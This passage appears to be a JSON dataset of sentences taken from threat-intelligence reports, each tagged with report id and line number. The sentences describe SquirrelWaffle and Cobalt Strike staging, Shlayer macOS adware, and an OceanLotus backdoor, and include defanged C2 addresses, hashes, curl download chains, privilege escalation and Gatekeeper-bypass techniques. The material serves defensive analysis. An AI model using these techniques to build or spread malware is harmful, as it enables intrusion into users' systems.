        "id": "cti_reports_filtered/r-558.md:::S45",
        "text": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.",
        "type": "",
        "report": "r-558",
        "line": 45,
        "index": 1587
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S46",
        "text": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "type": "",
        "report": "r-558",
        "line": 46,
        "index": 1588
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S47",
        "text": "An example decrypted response is shown below:\n",
        "type": "",
        "report": "r-558",
        "line": 47,
        "index": 1589
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S48",
        "text": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "type": "",
        "report": "r-558",
        "line": 48,
        "index": 1590
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S49",
        "text": "An example decrypted response is shown below:\n",
        "type": "",
        "report": "r-558",
        "line": 49,
        "index": 1591
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S50",
        "text": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.\n",
        "type": "",
        "report": "r-558",
        "line": 50,
        "index": 1592
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S51",
        "text": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.",
        "type": "",
        "report": "r-558",
        "line": 51,
        "index": 1593
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S52",
        "text": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.",
        "type": "",
        "report": "r-558",
        "line": 52,
        "index": 1594
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S53",
        "text": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.",
        "type": "",
        "report": "r-558",
        "line": 53,
        "index": 1595
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S54",
        "text": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.\n",
        "type": "",
        "report": "r-558",
        "line": 54,
        "index": 1596
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S55",
        "text": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the XOR-based algorithm replicated below in Figure 13.\n",
        "type": "",
        "report": "r-558",
        "line": 55,
        "index": 1597
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S56",
        "text": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:\n",
        "type": "",
        "report": "r-558",
        "line": 56,
        "index": 1598
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S0",
        "text": "As with much of the currently distributed adware, this malware is typically delivered via drive-by advertisements, posing as a fake Adobe Flash or related software updates.",
        "type": "",
        "report": "r-611",
        "line": 0,
        "index": 1599
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S1",
        "text": "Whether you receive the malware or a generic advertisement from the compromised domain depends on your browser\u2019s user-agent string, IP address, and relative last visit.",
        "type": "",
        "report": "r-611",
        "line": 1,
        "index": 1600
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S2",
        "text": "Given this determination, TAU developed a script to rotate through proxies, visit the main advertisement domain (in this example case, dubbeldachs[.]com), follow through all redirects, detect if the site is malicious or not, capture a screenshot + page source + malware payload, and categorize the data.",
        "type": "",
        "report": "r-611",
        "line": 2,
        "index": 1601
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S3",
        "text": "Below is a sample screenshot of this script in action:\n",
        "type": "",
        "report": "r-611",
        "line": 3,
        "index": 1602
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S4",
        "text": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "type": "",
        "report": "r-611",
        "line": 4,
        "index": 1603
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S5",
        "text": "In total at that time, there were well over 5,000 unique hashes confirmed, meaning that banning via hash would be ineffective due to the rate at which binaries are re-compiled or otherwise modified.",
        "type": "",
        "report": "r-611",
        "line": 5,
        "index": 1604
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S6",
        "text": "The following screenshot illustrates a sample delivery site typical of Shlayer (and other adware):\n",
        "type": "",
        "report": "r-611",
        "line": 6,
        "index": 1605
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S7",
        "text": "In addition to malicious DMG / ISO / PKG downloaders, various redirects contained browser extensions.",
        "type": "",
        "report": "r-611",
        "line": 7,
        "index": 1606
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S8",
        "text": "All infection vectors required user interaction at some level in order to compromise the host, including installation of software packages and authentication.\n",
        "type": "",
        "report": "r-611",
        "line": 8,
        "index": 1607
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S9",
        "text": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.\n",
        "type": "",
        "report": "r-611",
        "line": 9,
        "index": 1608
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S10",
        "text": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "type": "",
        "report": "r-611",
        "line": 10,
        "index": 1609
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S11",
        "text": "To this point, all discovered samples of this malware have targeted only macOS.",
        "type": "",
        "report": "r-611",
        "line": 11,
        "index": 1610
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S12",
        "text": "The malware employs multiple levels of obfuscation and is capable of privilege escalation.",
        "type": "",
        "report": "r-611",
        "line": 12,
        "index": 1611
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S13",
        "text": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "type": "",
        "report": "r-611",
        "line": 13,
        "index": 1612
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S14",
        "text": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "type": "",
        "report": "r-611",
        "line": 14,
        "index": 1613
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S15",
        "text": "The following analysis results reflect execution of a DMG-based payload.",
        "type": "",
        "report": "r-611",
        "line": 15,
        "index": 1614
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S16",
        "text": "Note:",
        "type": "",
        "report": "r-611",
        "line": 16,
        "index": 1615
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S17",
        "text": "There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "type": "",
        "report": "r-611",
        "line": 17,
        "index": 1616
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S18",
        "text": "The paths noted below represent only those of the original variants directly observed and verified by TAU via binary analysis or across our customer base.",
        "type": "",
        "report": "r-611",
        "line": 18,
        "index": 1617
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S19",
        "text": "The samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL.",
        "type": "",
        "report": "r-611",
        "line": 19,
        "index": 1618
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S20",
        "text": "This is an important distinction for detection, as the \u20130 (force http 1.0) argument is not generally used legitimately, whereas usage of \u2013s (silent) and \u2013S (show errors) is more common.\n",
        "type": "",
        "report": "r-611",
        "line": 20,
        "index": 1619
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S21",
        "text": "The following represents a high-level overview of the process execution and infection chain for a typical Shlayer installation:\n",
        "type": "",
        "report": "r-611",
        "line": 21,
        "index": 1620
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S22",
        "text": "As referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file.",
        "type": "",
        "report": "r-611",
        "line": 22,
        "index": 1621
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S23",
        "text": "The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below:\n",
        "type": "",
        "report": "r-611",
        "line": 23,
        "index": 1622
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S24",
        "text": "When this DMG is mounted and the installer executed, a .command script is executed from a hidden directory in the mounted volume.",
        "type": "",
        "report": "r-611",
        "line": 24,
        "index": 1623
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S25",
        "text": "This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed.",
        "type": "",
        "report": "r-611",
        "line": 25,
        "index": 1624
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S26",
        "text": "A sample .command script is shown in Figure 2 below, along with the two subsequent decoded/decrypted scripts.",
        "type": "",
        "report": "r-611",
        "line": 26,
        "index": 1625
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S27",
        "text": "Although the format and sequence of these scripts vary among samples, the basic overall execution chain remains the same.\n",
        "type": "",
        "report": "r-611",
        "line": 27,
        "index": 1626
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S28",
        "text": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "type": "",
        "report": "r-611",
        "line": 28,
        "index": 1627
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S29",
        "text": "The decoded script in Figure 4 above represents the final steps of the first stage of this infection, performing the following after identifying the script location (e.g. /Volumes/Player/.hidden) and performing a verification check:\n",
        "type": "",
        "report": "r-611",
        "line": 29,
        "index": 1628
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S30",
        "text": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system) \n",
        "type": "",
        "report": "r-611",
        "line": 30,
        "index": 1629
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S31",
        "text": "- Generates a \u201cSession GUID\u201d using uuidgen \n",
        "type": "",
        "report": "r-611",
        "line": 31,
        "index": 1630
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S32",
        "text": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "type": "",
        "report": "r-611",
        "line": 32,
        "index": 1631
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S33",
        "text": "For example:\n",
        "type": "",
        "report": "r-611",
        "line": 33,
        "index": 1632
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S34",
        "text": "- Attempts to download the zip file payload using curl (with arguments of either \u201c-f0L\u201d or \u201c\u2013fsL\u201d as mentioned above)\n",
        "type": "",
        "report": "r-611",
        "line": 34,
        "index": 1633
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S35",
        "text": "- Creates a directory in /tmp to store the payload and unzips the password-protected payload (note: the zip password is hardcoded in the script per sample)\n",
        "type": "",
        "report": "r-611",
        "line": 35,
        "index": 1634
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S36",
        "text": "- Makes the binary within the unzipped .app executable using chmod +x\n",
        "type": "",
        "report": "r-611",
        "line": 36,
        "index": 1635
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S37",
        "text": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/\n",
        "type": "",
        "report": "r-611",
        "line": 37,
        "index": 1636
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S38",
        "text": "- Performs a killall Terminal to kill the running script\u2019s terminal window\n",
        "type": "",
        "report": "r-611",
        "line": 38,
        "index": 1637
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S39",
        "text": "After the second stage payload is downloaded and executed, it attempts to escalate privileges with sudo using a technique invoking /usr/libexec/security_authtrampoline as discussed in Patrick Wardle\u2019s DEFCON 2017 talk \u201cDeath by 1000 Installers\u201d and now documented under MITRE ATT&CK TID 1514 (Elevated Execution with Prompt)1.",
        "type": "",
        "report": "r-611",
        "line": 39,
        "index": 1638
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S40",
        "text": "Once the malware has elevated to root privileges, it attempts to download additional software (observed to be adware in the analyzed samples) and bypasses Gatekeeper for the downloaded software.",
        "type": "",
        "report": "r-611",
        "line": 40,
        "index": 1639
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S41",
        "text": "This allows the allowlisted software to run without user intervention even if the system is set to disallow unknown applications downloaded from the internet.",
        "type": "",
        "report": "r-611",
        "line": 41,
        "index": 1640
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S42",
        "text": "Furthermore, many of the payloads contained within the second stage download are signed with a valid developer ID as seen in red in the screenshot below:\n",
        "type": "",
        "report": "r-611",
        "line": 42,
        "index": 1641
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S43",
        "text": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "type": "",
        "report": "r-611",
        "line": 43,
        "index": 1642
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S44",
        "text": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "type": "",
        "report": "r-611",
        "line": 44,
        "index": 1643
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S45",
        "text": "Although some of this process has changed with the introduction of notarization in macOS Mojave version 10.14.5, in previous versions a dialog such as the following would be displayed when opening an application that was not installed from the App Store:\n",
        "type": "",
        "report": "r-611",
        "line": 45,
        "index": 1644
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S46",
        "text": "If we examine one of the first stage Shlayer DMG packages, we can see that the initial executable that is launched by the installer is signed by a valid Apple Developer ID (in the case illustrated below, Brianna Sanchez).",
        "type": "",
        "report": "r-611",
        "line": 46,
        "index": 1645
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S47",
        "text": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "type": "",
        "report": "r-611",
        "line": 47,
        "index": 1646
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S48",
        "text": "As Apple Developer accounts have previously been fairly easy to register (just requiring an Apple ID and $99 yearly fee), almost anyone could create an application with a valid certificate.",
        "type": "",
        "report": "r-611",
        "line": 48,
        "index": 1647
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S49",
        "text": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "type": "",
        "report": "r-611",
        "line": 49,
        "index": 1648
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S50",
        "text": "As of February 27th 2019, two-factor authentication (2FA) is required for the main holder of a team\u2019s Apple Developer account to sign in with their Apple ID, creating an additional layer of security for the creation of certificates.",
        "type": "",
        "report": "r-611",
        "line": 50,
        "index": 1649
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S51",
        "text": "This is significant as Apple\u2019s form of two-factor authentication varies from typical 2FA systems which just require a verification code from an email or SMS message.",
        "type": "",
        "report": "r-611",
        "line": 51,
        "index": 1650
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S52",
        "text": "Validity of an application\u2019s certificate can be verified using the spctl or codesign commands as seen below:\n",
        "type": "",
        "report": "r-611",
        "line": 52,
        "index": 1651
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S53",
        "text": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:\n",
        "type": "",
        "report": "r-611",
        "line": 53,
        "index": 1652
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S54",
        "text": "Sanchez Scarlett Nichols Carson Clement Dana Jasper Osmund Rios Becky Simmons Brianna Fergus Basil Beatrix Hilary Andrews Declan Raymond Amanda Arnold Eleanor Blanche Augusta Bennett Marvin Janson Chase Leighton Ganesa Mendez Melody\n",
        "type": "",
        "report": "r-611",
        "line": 54,
        "index": 1653
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S55",
        "text": "However, unlike files downloaded from a web browser, when a file is downloaded via the command line utility curl, the quarantine attribute flag required for Gatekeeper\u2019s check is not added to the file.",
        "type": "",
        "report": "r-611",
        "line": 55,
        "index": 1654
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S56",
        "text": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "type": "",
        "report": "r-611",
        "line": 56,
        "index": 1655
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S57",
        "text": "This means that if the first stage is able to execute, the second stage script is likely to run without further prompt to the user after initial authentication.",
        "type": "",
        "report": "r-611",
        "line": 57,
        "index": 1656
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S58",
        "text": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "type": "",
        "report": "r-611",
        "line": 58,
        "index": 1657
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S59",
        "text": "If the signature has been revoked, the software will exit regardless of whether Gatekeeper has been successfully bypassed.",
        "type": "",
        "report": "r-611",
        "line": 59,
        "index": 1658
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S60",
        "text": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "type": "",
        "report": "r-611",
        "line": 60,
        "index": 1659
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S61",
        "text": "Furthermore, there have been several changes to the security of the Apple Developer program with the introduction of notarization in macOS 10.14.5.",
        "type": "",
        "report": "r-611",
        "line": 61,
        "index": 1660
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S62",
        "text": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "type": "",
        "report": "r-611",
        "line": 62,
        "index": 1661
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S63",
        "text": "We continue to monitor this threat however and will provide updates should anything change.",
        "type": "",
        "report": "r-611",
        "line": 63,
        "index": 1662
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S64",
        "text": "The status of a notarized application can be verified using the XCode command line tool stapler with the validate parameter as seen below \u2013 this command will return \u201cThe validate action worked!\u201d for a valid notarized app, but will return nothing if the app has not been notarized.\n",
        "type": "",
        "report": "r-611",
        "line": 64,
        "index": 1663
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S65",
        "text": "Due to the number of known IOCs for this malware, hash-based prevention is extremely ineffective for this campaign as executables are being frequently modified and recompiled.",
        "type": "",
        "report": "r-611",
        "line": 65,
        "index": 1664
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S66",
        "text": "As of today, there are thousands of unique known samples and the list continues to grow.",
        "type": "",
        "report": "r-611",
        "line": 66,
        "index": 1665
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S67",
        "text": "Because of this, we recommend detection and monitoring strategies based around behavioral indicators rather than hash- or other IOC-based indicators.",
        "type": "",
        "report": "r-611",
        "line": 67,
        "index": 1666
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S68",
        "text": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "type": "",
        "report": "r-611",
        "line": 68,
        "index": 1667
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S69",
        "text": "This succession of activity can be seen in the sequence of screenshots below which show the execution of the final script in the first stage, using bash along with the system utilities described above to download and execute the second stage payload.",
        "type": "",
        "report": "r-611",
        "line": 69,
        "index": 1668
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S70",
        "text": "After the second stage malware downloaded by curl has been entrenched and gained root access, it is able to then download and install additional software as seen in the process tree below:\n",
        "type": "",
        "report": "r-611",
        "line": 70,
        "index": 1669
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S71",
        "text": "This illustrates the true danger of Shlayer: although it is considered Adware, and therefore often dismissed as a lower threat, successful infections of this malware result in the entrenchment of a backdoor that allows for the installation of any software as the root user.",
        "type": "",
        "report": "r-611",
        "line": 71,
        "index": 1670
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S72",
        "text": "Even though we know of no known cases of Shlayer installing any software more nefarious than additional adware or cryptominers, it has the ability to install rootkits or other more serious threats once entrenched.",
        "type": "",
        "report": "r-611",
        "line": 72,
        "index": 1671
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S73",
        "text": "Furthermore, while the analyzed samples above do not attempt to conceal their network activity, newer samples have been reported to use further obfuscation of payloads and encryption of network traffic.",
        "type": "",
        "report": "r-611",
        "line": 73,
        "index": 1672
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S74",
        "text": "Despite these changes however, the ability to detect the early-stage behavioral indicators of this malware can easily prevent infection and protect the organization.\n",
        "type": "",
        "report": "r-611",
        "line": 74,
        "index": 1673
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S75",
        "text": "For more information on how Carbon Black\u2019s products protect from these threats, please see the Shlayer TAU-TIN on our user exchange.\n",
        "type": "",
        "report": "r-611",
        "line": 75,
        "index": 1674
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S0",
        "text": "The sample arrives as an app bundled in a Zip archive.",
        "type": "",
        "report": "r-625",
        "line": 0,
        "index": 1675
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S1",
        "text": "It uses the icon for a Word document file as a disguise, attempting to pass itself off as a legitimate document file.\n",
        "type": "",
        "report": "r-625",
        "line": 1,
        "index": 1676
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S2",
        "text": "Another technique it uses to evade detection is adding special characters to its app bundle name.",
        "type": "",
        "report": "r-625",
        "line": 2,
        "index": 1677
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S3",
        "text": "When a user looks for the fake doc folder via the macOS Finder app or the terminal command line, the folder's name shows \"ALL tim nha Chi Ngoc Canada.doc\" (\u201ct\u00ecm nh\u00e0 Ch\u1ecb Ng\u1ecdc\u201d roughly translates to \u201cfind Mrs. Ngoc\u2019s house\u201d).",
        "type": "",
        "report": "r-625",
        "line": 3,
        "index": 1678
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S4",
        "text": "However, checking the original Zip file that contains the folder shows 3 unexpected bytes between \".\" and \"doc\".\n",
        "type": "",
        "report": "r-625",
        "line": 4,
        "index": 1679
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S5",
        "text": "The 3 bytes \"efb880\" is in UTF-8 encoding.",
        "type": "",
        "report": "r-625",
        "line": 5,
        "index": 1680
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S6",
        "text": "According to UTF-8 mapping, the related Unicode code is \"U+FE00\".\n",
        "type": "",
        "report": "r-625",
        "line": 6,
        "index": 1681
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S7",
        "text": "\"U+FE00\" is a special Unicode control character with name variation selector-1, which provides the visual appearance of a CJK compatibility ideograph.",
        "type": "",
        "report": "r-625",
        "line": 7,
        "index": 1682
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S8",
        "text": "In this case, the preceding character is the general character \".\", so the variation selector does not change the visual appearance.",
        "type": "",
        "report": "r-625",
        "line": 8,
        "index": 1683
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S9",
        "text": "The operating system sees the app bundle as an unsupported directory type, so as a default action the \u201copen\u201d command is used to execute the malicious app.",
        "type": "",
        "report": "r-625",
        "line": 9,
        "index": 1684
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S10",
        "text": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.\n",
        "type": "",
        "report": "r-625",
        "line": 10,
        "index": 1685
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S11",
        "text": "Here is the code signing information for the app bundle sample.\n",
        "type": "",
        "report": "r-625",
        "line": 11,
        "index": 1686
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S12",
        "text": "The app bundle contains two notable files:\n",
        "type": "",
        "report": "r-625",
        "line": 12,
        "index": 1687
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S13",
        "text": "- ALL tim nha Chi Ngoc Canada: The shell script containing the main malicious routines\n",
        "type": "",
        "report": "r-625",
        "line": 13,
        "index": 1688
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S14",
        "text": "- configureDefault.def: The word file displayed during execution\n",
        "type": "",
        "report": "r-625",
        "line": 14,
        "index": 1689
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S15",
        "text": "When the shell script was run, it performed the following routines:\n",
        "type": "",
        "report": "r-625",
        "line": 15,
        "index": 1690
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S16",
        "text": "- Delete the file quarantine attribute for the files in \"*ALL tim nha Chi Ngoc Canada.?doc*\u201d\n",
        "type": "",
        "report": "r-625",
        "line": 16,
        "index": 1691
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S17",
        "text": "- Attempt to remove file quarantine attribute of the files in the system.\n",
        "type": "",
        "report": "r-625",
        "line": 17,
        "index": 1692
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S18",
        "text": "- Copy \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(doc)\" to \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"\n",
        "type": "",
        "report": "r-625",
        "line": 18,
        "index": 1693
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S19",
        "text": "- Open \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"\n",
        "type": "",
        "report": "r-625",
        "line": 19,
        "index": 1694
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S20",
        "text": "- Extract the b64-encoded fat binary to \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(fat - binary)\", which is the second-stage payload\n",
        "type": "",
        "report": "r-625",
        "line": 20,
        "index": 1695
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S21",
        "text": "- Change access permission of second-stage payload to execute the launch of the second-stage payload\n",
        "type": "",
        "report": "r-625",
        "line": 21,
        "index": 1696
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S22",
        "text": "- Delete the malware app bundle \"ALL tim nha Chi Ngoc Canada.?doc\"\n",
        "type": "",
        "report": "r-625",
        "line": 22,
        "index": 1697
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S23",
        "text": "- Copy \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\" to \"{execution directory}/ALL tim nha Chi Ngoc Canada.doc\"\n",
        "type": "",
        "report": "r-625",
        "line": 23,
        "index": 1698
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S24",
        "text": "- Delete \"/tmp/ALL tim nha Chi Ngoc Canada.doc\"\n",
        "type": "",
        "report": "r-625",
        "line": 24,
        "index": 1699
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S25",
        "text": "When executed, the second stage payload (ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def) performs the following malware routines:\n",
        "type": "",
        "report": "r-625",
        "line": 25,
        "index": 1700
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S26",
        "text": "- Drop third-stage payload to ~/Library/User Photos/mount_devfs\n",
        "type": "",
        "report": "r-625",
        "line": 26,
        "index": 1701
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S27",
        "text": "- Create persistence for the sample by creating ~/Library/LaunchAgents/com.apple.marcoagent.voiceinstallerd.plist\n",
        "type": "",
        "report": "r-625",
        "line": 27,
        "index": 1702
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S28",
        "text": "- Use the touch command to change the timestamp of the sample\n",
        "type": "",
        "report": "r-625",
        "line": 28,
        "index": 1703
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S29",
        "text": "- Delete itself\n",
        "type": "",
        "report": "r-625",
        "line": 29,
        "index": 1704
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S30",
        "text": "In the third-stage payload (~/Library/User Photos/mount_devfs), the strings are encrypted with custom encryption using base64 encoding and byte manipulation.\n",
        "type": "",
        "report": "r-625",
        "line": 30,
        "index": 1705
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S31",
        "text": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "type": "",
        "report": "r-625",
        "line": 31,
        "index": 1706
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S32",
        "text": "It collects the following information from the infected system by invoking the following commands:\n",
        "type": "",
        "report": "r-625",
        "line": 32,
        "index": 1707
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S33",
        "text": "The collected information is encrypted and sent to the malware C&C server.\n",
        "type": "",
        "report": "r-625",
        "line": 33,
        "index": 1708
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S34",
        "text": "It also receives commands from the same server.\n",
        "type": "",
        "report": "r-625",
        "line": 34,
        "index": 1709
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S35",
        "text": "Here are the C&C servers used by the malware:\n",
        "type": "",
        "report": "r-625",
        "line": 35,
        "index": 1710
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S36",
        "text": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:\n",
        "type": "",
        "report": "r-625",
        "line": 36,
        "index": 1711
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S37",
        "text": "Below are the supported commands and their respective codes (taken from an earlier blog post that covered OceanLotus).\n",
        "type": "",
        "report": "r-625",
        "line": 37,
